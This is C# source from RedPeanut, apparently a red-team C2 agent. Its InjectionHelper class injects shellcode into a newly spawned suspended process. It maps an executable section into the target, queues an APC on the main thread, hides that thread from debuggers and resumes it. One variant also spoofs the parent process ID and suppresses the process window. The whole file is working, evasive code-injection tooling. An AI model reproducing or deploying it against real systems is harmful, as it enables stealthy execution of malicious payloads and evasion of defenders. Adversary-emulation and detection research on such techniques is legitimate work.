﻿//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using RedPeanutAgent.Core;
using System;
using System.Runtime.InteropServices;

namespace RedPeanutAgent.Execution
{
    class InjectionHelper
    {
        public static bool SapwnAndInject(string binary, byte[] payload)
        {
            Natives.PROCESS_INFORMATION procInfo = new Natives.PROCESS_INFORMATION();
            if (!Spawner.CreateProcess(binary, true, ref procInfo))
            {
                return false;
            }

            //Round payload size to page size
            uint size = InjectionHelper.GetSectionSize(payload.Length);

            //Crteate section in current process
            IntPtr section = IntPtr.Zero;
            section = InjectionHelper.CreateSection(size);
            if (section == IntPtr.Zero)
            {
                return false;
            }

            //Map section to current process
            IntPtr baseAddr = IntPtr.Zero;
            IntPtr viewSize = (IntPtr)size;
            InjectionHelper.MapViewOfSection(section, Natives.GetCurrentProcess(), ref baseAddr, ref viewSize);
            if (baseAddr == IntPtr.Zero)
            {
                return false;
            }

            //Copy payload to current process section
            Marshal.Copy(payload, 0, baseAddr, payload.Length);

            //Map remote section
            IntPtr baseAddrEx = IntPtr.Zero;
            IntPtr viewSizeEx = (IntPtr)size;
            InjectionHelper.MapViewOfSection(section, procInfo.hProcess, ref baseAddrEx, ref viewSizeEx);
            if (baseAddrEx == IntPtr.Zero || viewSizeEx == IntPtr.Zero)
            {
                return false;
            }

            if (!InjectionHelper.UnMapViewOfSection(baseAddr))
            {
                return false;
            }

            // Assign address of shellcode to the target thread apc queue
            if (!InjectionHelper.QueueApcThread(baseAddrEx, procInfo))
            {
                return false;
            }

            IntPtr infoth = InjectionHelper.SetInformationThread(procInfo);
            if (infoth == IntPtr.Zero)
            {
                return false;
            }

            InjectionHelper.ResumeThread(procInfo);

            Natives.CloseHandle(procInfo.hThread);
            Natives.CloseHandle(procInfo.hProcess);

            return true;
        }

        public static bool SapwnAndInjectPPID(string binary, byte[] payload, int ppid)
        {
            Natives.PROCESS_INFORMATION procInfo = new Natives.PROCESS_INFORMATION();
            Natives.CreationFlags flags = Natives.CreationFlags.CREATE_SUSPENDED | Natives.CreationFlags.DETACHED_PROCESS 
                | Natives.CreationFlags.CREATE_NO_WINDOW | Natives.CreationFlags.EXTENDED_STARTUPINFO_PRESENT;

            if (!Spawner.CreateProcess(binary, ppid, flags, ref procInfo))
            {
                return false;
            }

            //Round payload size to page size
            uint size = InjectionHelper.GetSectionSize(payload.Length);

            //Crteate section in current process
            IntPtr section = IntPtr.Zero;
            section = InjectionHelper.CreateSection(size);
            if (section == IntPtr.Zero)
            {
                return false;
            }

            //Map section to current process
            IntPtr baseAddr = IntPtr.Zero;
            IntPtr viewSize = (IntPtr)size;
            InjectionHelper.MapViewOfSection(section, Natives.GetCurrentProcess(), ref baseAddr, ref viewSize);
            if (baseAddr == IntPtr.Zero)
            {
                return false;
            }

            //Copy payload to current process section
            Marshal.Copy(payload, 0, baseAddr, payload.Length);

            //Map remote section
            IntPtr baseAddrEx = IntPtr.Zero;
            IntPtr viewSizeEx = (IntPtr)size;
            InjectionHelper.MapViewOfSection(section, procInfo.hProcess, ref baseAddrEx, ref viewSizeEx);
            if (baseAddrEx == IntPtr.Zero || viewSizeEx == IntPtr.Zero)
            {
                return false;
            }

            if (!InjectionHelper.UnMapViewOfSection(baseAddr))
            {
                return false;
            }

            // Assign address of shellcode to the target thread apc queue
            if (!InjectionHelper.QueueApcThread(baseAddrEx, procInfo))
            {
                return false;
            }

            IntPtr infoth = InjectionHelper.SetInformationThread(procInfo);
            if (infoth == IntPtr.Zero)
            {
                return false;
            }

            InjectionHelper.ResumeThread(procInfo);

            Natives.CloseHandle(procInfo.hThread);
            Natives.CloseHandle(procInfo.hProcess);

            return true;
        }

        public static uint GetSectionSize(int plength)
        {
            Natives.SYSTEM_INFO info = new Natives.SYSTEM_INFO();
            Natives.GetSystemInfo(ref info);
            uint size = info.dwPageSize - (uint)plength % info.dwPageSize + (uint)plength;
            return size;
        }

        public static IntPtr CreateSection(uint size)
        {
            Natives.LARGE_INTEGER largeinteger = new Natives.LARGE_INTEGER();
            largeinteger.LowPart = size;

            IntPtr section = IntPtr.Zero;
            if (Natives.ZwCreateSection(ref section, Natives.GenericAll, IntPtr.Zero, ref largeinteger, Natives.PAGE_EXECUTE_READWRITE, Natives.SecCommit, IntPtr.Zero) != 0)
            {
                return IntPtr.Zero;
            }
            return section;
        }

        public static bool MapViewOfSection(IntPtr section, IntPtr hprocess, ref IntPtr baseAddr, ref IntPtr viewSize)
        {
            IntPtr soffset = IntPtr.Zero;

            if (Natives.ZwMapViewOfSection(section, hprocess, ref baseAddr, IntPtr.Zero, IntPtr.Zero, soffset, ref viewSize, 1, 0, Natives.PAGE_EXECUTE_READWRITE) != 0)
            {
                return false;
            }
            return true;
        }

        public static bool UnMapViewOfSection(IntPtr baseaddr)
        {
            IntPtr soffset = IntPtr.Zero;

            if (Natives.ZwUnmapViewOfSection(Natives.GetCurrentProcess(), baseaddr) != 0)
            {
                return false;
            }
            return true;
        }

        public static bool QueueApcThread(IntPtr baseAddr, Natives.PROCESS_INFORMATION procInfo)
        {
            IntPtr th = procInfo.hThread;
            if (Natives.ZwQueueApcThread(th, baseAddr, IntPtr.Zero) != 0)
            {
                return false;
            }
            return true;
        }

        public static IntPtr SetInformationThread(Natives.PROCESS_INFORMATION procInfo)
        {
            IntPtr th = procInfo.hThread;
            IntPtr infoth = Natives.ZwSetInformationThread(th, 1, IntPtr.Zero, 0);

            return infoth;
        }

        public static int ResumeThread(Natives.PROCESS_INFORMATION procInfo)
        {
            IntPtr th = procInfo.hThread;
            ulong outsupn = 0;
            int rest = Natives.ZwResumeThread(th, out outsupn);
            return rest;
        }
    }
}
